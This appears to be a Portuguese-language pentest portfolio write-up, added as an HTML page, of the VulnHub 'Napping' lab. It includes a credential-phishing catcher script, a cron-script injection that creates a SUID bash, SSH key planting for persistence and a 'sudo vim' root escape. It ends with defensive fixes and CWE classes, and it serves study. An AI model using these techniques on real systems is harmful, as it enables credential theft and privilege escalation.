@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'; font-src 'self'; img-src 'self' data:; connect-src 'none'; base-uri 'none'; form-action 'none'; object-src 'none'; upgrade-insecure-requests">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Ezequiel — portfólio de segurança ofensiva.">
+<title>VulnHub Napping — Ezequiel</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<header class="topbar"><div class="wrap">
+  <a class="brand" href="../index.html"><span class="p">~/</span>ezequiel<span class="blink">_</span></a>
+  <nav><a href="../index.html#labs">labs</a><a href="../index.html#htb">htb</a><a href="../index.html#thm">thm</a><a href="../index.html#vulnhub">vulnhub</a><a href="../index.html#artigos">artigos</a><a href="../index.html#projetos">projetos</a><a href="../index.html#contato">contato</a></nav>
+</div></header>
+<section class="writeup" id="vulnhub-napping"><div class="wrap">
+  <a class="back" href="../index.html#vulnhub">← voltar ao portfólio</a>
+  <h1>VulnHub — Napping 1.0.1</h1>
+  <div class="meta-row">
+    <span class="plat">VulnHub · público</span>
+    <span class="diff critico">INTERMEDIÁRIO</span>
+    <span class="tag">phishing (admin bot)</span><span class="tag">reverse tabnabbing</span><span class="tag">reuso de credencial</span><span class="tag">cron writable</span><span class="tag">sudo GTFOBins</span>
+  </div>
+
+  <div class="wu-sec">
+    <h2>resumo</h2>
+    <p class="u-muted">Máquina Linux (Ubuntu 20.04) cujo diferencial é o vetor inicial: a aplicação deixa qualquer um submeter um <b>link</b> "para o admin revisar", e o admin é um <b>bot headless que visita o link e preenche login</b>. Explorei isso com uma página de login falsa para capturar as credenciais do admin. Daí, reuso de senha (config.php) → SSH, um <b>script de cron gravável</b> e um <code>sudo vim</code> levaram a root.</p>
+    <pre><code>Formulário "Blog Link" (admin bot visita o link submetido)
+        │  página de login falsa hospedada pelo atacante
+        ▼
+Bot envia credenciais → capturadas (phishing)
+        │
+        ▼
+config.php vaza creds  ──►  reuso de senha  ──►  SSH (daniel)
+        │
+        ▼
+/home/adrian/query.py gravável + cron 2min  ──►  vira adrian
+        │
+        ▼
+sudo NOPASSWD /usr/bin/vim (GTFOBins)  ──►  ROOT</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 1 — reconhecimento</h2>
+    <pre><code>arp-scan -l                       # descobre o IP na rede host-only
+nmap -Pn -n -sV -A 192.168.56.103</code></pre>
+    <p class="u-muted">Duas portas: <b>22</b> (OpenSSH 8.2p1) e <b>80</b> (Apache 2.4.41, app PHP com submissão de links). A aplicação <b>reflete</b> o parâmetro <code>url</code> de volta no HTML — provei XSS armazenado, mas o admin é <b>headless</b> e não carrega cookie de sessão, então roubo de cookie não leva a nada. O caminho real é outro.</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 2 — ataque web: phishing via admin bot</h2>
+    <div class="mech">
+      <p><b>Mecanismo (o coração da box):</b> o formulário aceita um link externo <b>sem validar domínio</b> (sem whitelist), e um <b>cliente privilegiado automatizado</b> (o "admin") visita esse link e <b>digita suas credenciais em qualquer formulário de login</b> que encontrar. Isso é a combinação de duas falhas: ausência de validação de destino (open redirect / link externo) + um bot que autentica cegamente. A técnica original da máquina é o <b>reverse tabnabbing</b> (<code>window.opener</code>) — testei —, mas o que capturou a senha de fato foi simplesmente apontar o bot para uma <b>réplica da página de login</b>.</p>
+    </div>
+    <p class="u-muted">Montei um servidor HTTP em Python (no Kali) que serve a página falsa, captura o POST e redireciona o bot de volta ao site real (para não levantar suspeita):</p>
+    <pre><code># catcher.py (essência) — serve o login falso e loga as credenciais do POST
+def do_POST(self):
+    n = int(self.headers['Content-Length'])
+    dados = urllib.parse.parse_qs(self.rfile.read(n).decode())
+    print("CAPTURADO:", dados.get('username'), dados.get('password'))
+    self.send_response(302)                       # redireciona de volta ao alvo
+    self.send_header("Location", "http://192.168.56.103/welcome.php")
+    self.end_headers()</code></pre>
+    <pre><code># no campo "Blog Link" do alvo, submeti:
+http://192.168.56.102/index.html
+# o bot visitou, preencheu e enviou:
+#   usuário: admin
+#   senha:   [capturada no catcher]</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 3 — acesso inicial (reuso de credencial)</h2>
+    <p class="u-muted">Enumerando a aplicação, o <code>/var/www/html/config.php</code> expôs credenciais do banco em texto claro:</p>
+    <pre><code>adrian : P@sswr0d456          # CWE-798 (credencial hard-coded)</code></pre>
+    <p class="u-muted">A senha estava <b>reutilizada</b> no SO — login SSH como <code>daniel</code> (mesmo grupo <code>administrators</code> do adrian). Credencial de aplicação virou acesso ao sistema (CWE-522).</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 4 — privesc daniel → adrian (cron writable)</h2>
+    <p class="u-muted">O LinPEAS apontou um script no home do adrian, executado por cron a cada 2 minutos, <b>gravável pelo grupo administrators</b>:</p>
+    <pre><code>*/2 * * * * /usr/bin/python3 /home/adrian/query.py</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo:</b> quem tem privilégio menor (grupo administrators) pode <b>escrever</b> um arquivo que um processo de maior privilégio (cron do adrian) <b>executa</b> — quebra de fronteira de confiança (CWE-732). Acrescentei uma linha ao script para, na próxima execução, criar um bash SUID de propriedade do adrian:</p>
+    </div>
+    <pre><code>echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' >> /home/adrian/query.py
+# após o cron: /tmp/rootbash -p  → euid=1000(adrian)</code></pre>
+    <p class="u-muted">Para persistir o acesso, injetei uma chave pública no <code>authorized_keys</code> do adrian e passei a logar direto por SSH como adrian.</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 5 — privesc adrian → root (sudo vim)</h2>
+    <pre><code>sudo -l
+# (root) NOPASSWD: /usr/bin/vim</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo:</b> o Vim rodando como root via <code>sudo</code> permite <b>escape para shell</b> (GTFOBins). Editores e interpretadores (vim, nano, python, perl) liberados no sudoers são root instantâneo — porque executam comando arbitrário do SO no contexto em que rodam (CWE-250, privilégio excessivo).</p>
+    </div>
+    <pre><code>sudo vim -c ':!/bin/sh'
+# id → uid=0(root)</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>flags</h2>
+    <pre><code>user.txt (/home/adrian) : You are nearly there!
+root.txt (/root)        : Admins just can't stay awake tsk tsk tsk</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>o que quebraria a cadeia (defesa)</h2>
+    <div class="fix">
+      <ul>
+        <li><b>Web:</b> validar o destino do link por whitelist de domínio; não ter um bot que autentica em páginas arbitrárias.</li>
+        <li><b>Cron:</b> <code>/home/adrian/query.py</code> deveria ser <code>700</code> ou pertencer ao root — nunca gravável por grupo.</li>
+        <li><b>Sudo:</b> remover <code>NOPASSWD</code> para <code>vim</code>; nunca liberar editores/interpretadores via sudo (GTFOBins).</li>
+        <li><b>Segredos:</b> tirar credenciais do <code>config.php</code>; não reutilizar senha de banco no SO.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="wu-sec">
+    <h2>classes (CWE)</h2>
+    <pre><code>CWE-601/1021  Open redirect / reverse tabnabbing  (link externo + bot)
+CWE-798/312   Credencial hard-coded em config.php
+CWE-522       Reuso de credencial (app → SSH)
+CWE-732       Script de cron gravável por grupo
+CWE-250       sudo vim → shell root (GTFOBins)</code></pre>
+  </div>
+</div></section>
+<footer><div class="wrap">
+  <span class="foot-note">// construído para estudo de pentest · máquina VulnHub (pública)</span>
+  <div class="links"><a href="../index.html">topo ↑</a><span class="foot-note">DCPT → eJPT → Security+ → PenTest+ → CPTS → OSCP</span></div>
+</div></footer>
+</body>
+</html>
